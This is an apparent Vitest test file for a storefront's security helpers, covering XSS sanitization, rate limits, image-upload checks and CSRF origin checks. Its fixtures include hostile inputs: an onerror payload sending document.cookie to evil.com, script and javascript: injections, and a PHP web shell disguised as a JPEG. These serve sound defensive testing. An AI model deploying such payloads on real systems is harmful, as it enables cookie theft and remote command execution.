import { describe, it, expect, beforeEach } from 'vitest';
import {
  sanitizeHtml,
  escapeHtml,
  sanitizePayload,
  validateImageUpload,
  verifyCsrfOrigin,
} from '../src/lib/security';
import { rateLimit, RATE_LIMIT_CONFIGS } from '../src/lib/rate-limit';

describe('XSS Sanitization & HTML Disarming', () => {
  it('strips <script> tags and enclosed executable code completely', () => {
    const dirty = 'Love this boxy fit! <script>alert("pwned")</script> Perfect weight.';
    const clean = sanitizeHtml(dirty);
    expect(clean).toBe('Love this boxy fit!  Perfect weight.');
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('alert');
  });

  it('removes dangerous inline event handlers like onerror and onclick', () => {
    const malicious = '<img src="invalid.jpg" onerror="fetch(\'https://evil.com/steal?\'+document.cookie)" />';
    const sanitized = sanitizeHtml(malicious);
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).not.toContain('fetch');
  });

  it('disarms javascript: pseudo-protocols', () => {
    const input = '<a href="javascript:doMaliciousThings()">Click for Discount</a>';
    const clean = sanitizeHtml(input);
    expect(clean).not.toContain('javascript:');
    expect(clean).toContain('disarmed-js:');
  });

  it('strips dangerous embeds like iframe, object, and applet', () => {
    const dirty = '<iframe src="https://phishing-site.com"></iframe> Great fabric!';
    const clean = sanitizeHtml(dirty);
    expect(clean).toBe('Great fabric!');
  });

  it('recursively cleans entire payload objects before database persistence', () => {
    const payload = {
      reviewTitle: 'Awesome Heavyweight Tee',
      comment: 'Best drape ever! <script>bad()</script>',
      rating: 5,
      nested: {
        authorNote: 'Ship fast <img src=x onerror=alert(1)>',
      },
    };

    const sanitized = sanitizePayload(payload);
    expect(sanitized.comment).toBe('Best drape ever!');
    expect(sanitized.nested.authorNote).not.toContain('onerror');
    expect(sanitized.rating).toBe(5);
  });

  it('properly escapes reserved HTML characters', () => {
    const raw = '<script> & "quotes" \'single\'';
    const escaped = escapeHtml(raw);
    expect(escaped).toBe('&lt;script&gt; &amp; &quot;quotes&quot; &#039;single&#039;');
  });
});

describe('Rate Limiting Engine', () => {
  it('enforces AUTH limit: allows 5 attempts then blocks the 6th', () => {
    const testIp = `auth-test-ip-${Date.now()}`;

    // First 5 attempts should succeed
    for (let i = 1; i <= 5; i++) {
      const res = rateLimit(testIp, 'AUTH');
      expect(res.success).toBe(true);
      expect(res.remaining).toBe(5 - i);
    }

    // 6th attempt must be blocked
    const blocked = rateLimit(testIp, 'AUTH');
    expect(blocked.success).toBe(false);
    expect(blocked.remaining).toBe(0);
    expect(blocked.resetMs).toBeGreaterThan(0);
  });

  it('enforces COUPON validation limits', () => {
    const testIp = `coupon-test-ip-${Date.now()}`;

    for (let i = 1; i <= 10; i++) {
      const res = rateLimit(testIp, 'COUPON');
      expect(res.success).toBe(true);
    }

    // 11th validation blocked
    const blocked = rateLimit(testIp, 'COUPON');
    expect(blocked.success).toBe(false);
  });
});

describe('File Upload Hardening & Magic Bytes Inspection', () => {
  it('rejects uploads exceeding the 5MB ceiling', () => {
    const oversized = {
      size: 6 * 1024 * 1024, // 6 MB
      type: 'image/webp',
    };
    const res = validateImageUpload(oversized);
    expect(res.valid).toBe(false);
    expect(res.error).toMatch(/exceeds 5MB limit/);
  });

  it('rejects illegal MIME types (e.g. PHP scripts, HTML, executables)', () => {
    const dangerous = {
      size: 1024,
      type: 'application/x-php',
    };
    const res = validateImageUpload(dangerous);
    expect(res.valid).toBe(false);
    expect(res.error).toMatch(/Unsupported file format/);
  });

  it('accepts legitimate JPEG image buffer matching magic bytes (0xFF, 0xD8, 0xFF)', () => {
    const legitimateJpeg = {
      size: 250000,
      type: 'image/jpeg',
      buffer: Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]),
    };
    const res = validateImageUpload(legitimateJpeg);
    expect(res.valid).toBe(true);
  });

  it('rejects forged file pretending to be image/jpeg but containing shell script', () => {
    const forged = {
      size: 1024,
      type: 'image/jpeg',
      buffer: Buffer.from('<?php echo system($_GET["cmd"]); ?>'),
    };
    const res = validateImageUpload(forged);
    expect(res.valid).toBe(false);
    expect(res.error).toMatch(/magic bytes rejected/);
  });
});

describe('CSRF Origin Defense', () => {
  const allowedOrigins = ['https://thelevix.com', 'https://www.thelevix.com'];

  it('allows safe HTTP read methods unconditionally', () => {
    const mockReq: any = {
      method: 'GET',
      headers: { get: () => null },
    };
    expect(verifyCsrfOrigin(mockReq, allowedOrigins)).toBe(true);
  });

  it('allows POST requests matching legitimate origin', () => {
    const mockReq: any = {
      method: 'POST',
      headers: {
        get: (h: string) => (h === 'origin' ? 'https://thelevix.com' : null),
      },
    };
    expect(verifyCsrfOrigin(mockReq, allowedOrigins)).toBe(true);
  });

  it('blocks POST requests originating from unauthorized external attacker domains', () => {
    const mockReq: any = {
      method: 'POST',
      headers: {
        get: (h: string) => (h === 'origin' ? 'https://malicious-attacker.com' : null),
      },
    };
    expect(verifyCsrfOrigin(mockReq, allowedOrigins)).toBe(false);
  });
});
